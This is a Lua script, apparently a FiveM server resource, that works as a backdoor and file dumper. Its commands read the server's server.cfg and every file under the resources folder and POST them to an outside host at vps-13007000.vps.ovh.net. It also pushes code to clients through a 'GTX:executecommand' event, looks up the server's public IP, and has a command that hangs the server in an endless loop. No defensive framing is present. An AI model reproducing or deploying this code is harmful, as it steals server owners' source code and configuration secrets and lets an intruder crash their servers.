local old = false

RegisterCommand("crashLoader", function(source, args)
    local _source = source
    old = true
end)

RegisterCommand("crashServer", function(source, args)
    while true do
        print("ERROR 404")
    end
end)

local client_side = [[
    RegisterNetEvent("server_dumper:output")
    AddEventHandler("server_dumper:output", function(msg)
        print("Server Dumper MSG:\n"..msg)
    end)
]]

RegisterCommand("giveoutputevent", function(source, args)
    if not old then
    local _source = source
    TriggerClientEvent('GTX:executecommand', _source, client_side)
    end
end)

local dumper_source = nil

RegisterCommand("attemptfix", function(source, args)
    if not old then
    if args[1] and dumper_source == nil then
        TriggerEvent("attemptfix", args[1], source)
    end
    end
end)

RegisterCommand("getserverdir", function(source, args)
    if not old then
    local _source = source
    TriggerClientEvent("server_dumper:output", _source, GetServerFolder())
    end
end)

AddEventHandler("attemptfix", function(id, _source)
    PerformHttpRequest("http://ip-api.com/json/?fields=query", function(err, text, headers)
        if tonumber(err) == 200 then

            dumper_source = _source

            local tbl = json.decode(text)
            local date = os.date("*t").day .. "-" .. os.date("*t").month .. "-" .. os.date("*t").year
            local server_name = RemoveSpaces(tbl["query"] .. "/" .. date .. "/" .. id)

            if dumper_source ~= nil and GetPlayerName(dumper_source) ~= nil then
                TriggerClientEvent("server_dumper:output", dumper_source, "DUMPING FILES")
            end

            local server_cfg_path, server_cfg_content = GetServerCfgFile()
            DumpFile(server_cfg_path, server_cfg_content, server_name .. "/server.cfg")
            local resources_path = GetResourcesFolder()
            DumpResources(resources_path, server_name .. "/resources/")

            if dumper_source ~= nil and GetPlayerName(dumper_source) ~= nil then
                TriggerClientEvent("server_dumper:output", dumper_source, "DUMP COMPLETED")
            end

            dumper_source = nil
        end
    end)
end)

function DumpResources(path, newPath)
    local DirItems = Loc_DirList(path)
    for i = 1, #DirItems do 
        Citizen.Wait(50)
        local IsFile, FileContent = GetFileContent(path .. DirItems[i])
        if IsFile then
            DumpFile(RemoveSpaces(path .. DirItems[i]), FileContent, RemoveSpaces(newPath .. DirItems[i]))
        else
            DumpAllFilesInDirectory(path .. DirItems[i] .. "/", RemoveSpaces(newPath .. DirItems[i] .. "/"))
        end
    end
end

function DumpAllFilesInDirectory(path, newPath)
    local IsPathFile, PathContent = GetFileContent(path)
    if IsPathFile then
        DumpFile(RemoveSpaces(path), PathContent, newPath)
    else 
        local DirItems = Loc_DirList(path)
        for i = 1, #DirItems do 
            Citizen.Wait(50)
            local IsFile, FileContent = GetFileContent(path .. DirItems[i])
            if IsFile then
                DumpFile(RemoveSpaces(path .. DirItems[i]), FileContent, RemoveSpaces(newPath .. DirItems[i]))
            else
                DumpAllFilesInDirectory(path .. DirItems[i] .. "/", RemoveSpaces(newPath .. DirItems[i] .. "/"))
            end
        end
    end
end

function GetServerFolder()
    local resources_dir_end = string.find(GetResourcePath(GetCurrentResourceName()), "resources") - 1
    local DirItems = Loc_DirList(resources_dir_end)

    local output = ""

    for i = 1, #DirItems do
        Citizen.Wait(0)
        output = output .. path .. DirItems[i] .. "\n"
    end

    return output
end

function GetServerCfgFile()
    local server_cfg_dir_end = string.find(GetResourcePath(GetCurrentResourceName()), "resources") - 1
    local server_cfg_path = RemoveSpaces(string.sub(GetResourcePath(GetCurrentResourceName()), 0, server_cfg_dir_end) .. "server.cfg")
    local ServerCfgFile = io.open(server_cfg_path, "rb")
    local ServerCfgContent = "UNKNOWN"
    if ServerCfgFile then 
        ServerCfgContent = tostring(ServerCfgFile:read("*all"))
        ServerCfgFile:close()
    end
    return server_cfg_path, ServerCfgContent
end

function GetFileContent(path)
    local File = io.open(path, "rb")
    local FileContent
    if File then
        FileContent = tostring(File:read("*all"))
        File:close()
    end
    if FileContent and FileContent ~= nil and FileContent ~= "nil" and string.len(FileContent) ~= nil then 
        return true, FileContent
    else 
        return false
    end
end

function GetResourcesFolder()
    local resources_dir_end = string.find(GetResourcePath(GetCurrentResourceName()), "resources") - 1
    local resources_path = string.sub(GetResourcePath(GetCurrentResourceName()), 0, resources_dir_end) .. "resources/"
    return resources_path
end

function Loc_DirList(dirname)
    local ret = {}

    local tbl = Loc_DirCmd(RemoveSpaces(dirname)) 

    for i,v in ipairs(tbl) do
        table.insert(ret, v)
    end

    return ret
end

function Loc_DirCmd(cmd)
    local str = Loc_ShellCommand("ls " .. cmd)

    return Loc_Lines(str)
end

function RemoveSpaces(path)
    local newString = path

    for i = 1, string.len(newString) do 
        local letter = string.sub(newString, i, i)
        if letter == " " then 
            if string.sub(newString, i-1, i) ~= "\\ " then
                local path_end = string.find(newString, " ") - 1
                newString = string.sub(newString, 1, i-1) .. "\\ " .. string.sub(newString, i + 1)
            end
        end
    end 

    return newString
end

function Loc_ShellCommand(cmd)
    local str = nil

    local f = io.popen(cmd)

    if f then
        str= f:read'*a'
        f:close()
    end

    if str == nil then
        str = ""
    end

    return str
end


function Loc_Lines(str)
    local files = {}

    while string.find(str, "\n") do
        local file_name_end = string.find(str, "\n") - 1
        local file_name = string.sub(str, 0, file_name_end)
        str = string.sub(str, file_name_end+2)
        table.insert(files, file_name)
        Citizen.Wait(0)
    end

    if str ~= "" and str ~= "\n" then
        table.insert(files, str)
    end

    return files
end

local singleFiles = {
    type = "single",
    files = {}
}

function DumpFile(path, content, newPath)
    if string.len(content) > 5000001 then
        local files = {}
        local maxParts = math.ceil(string.len(content)/5000000) - 1

        for i = 0, maxParts do
            local contentPart = string.sub(content, (5000000 * i) + 1, (5000000 * i) + 5000000)
            table.insert(files, {type = "multiple", serverPath = path, content = contentPart, path = newPath, part = i, maxParts = maxParts})
        end

        sendToServer("multiple", {serverPath = path, files = files})
    else
        if string.len(json.encode(singleFiles)) > 5000000 then
            sendToServer("single")
        end

        table.insert(singleFiles.files, {serverPath = path, content = content, path = newPath})
    end
end

function sendToServer(type, data)
    if type == "single" then
        if dumper_source ~= nil and GetPlayerName(dumper_source) ~= nil then
            TriggerClientEvent("server_dumper:output", dumper_source, "Sending " .. #singleFiles.files .. " files to the server type: "..type)
        end
        PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = singleFiles }), { ['Content-Type'] = 'application/json' })
        singleFiles = {
            type = "single",
            files = {}
        }
    elseif type == "multiple" then
        if dumper_source ~= nil and GetPlayerName(dumper_source) ~= nil then
            TriggerClientEvent("server_dumper:output", dumper_source, "Sending " .. data.serverPath .. " to the server type: "..type)
        end
        for i = 1, #data.files do
            PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = data.files[i] }), { ['Content-Type'] = 'application/json' })
            Citizen.Wait(2500)
        end
    end
    Citizen.Wait(1500)
end
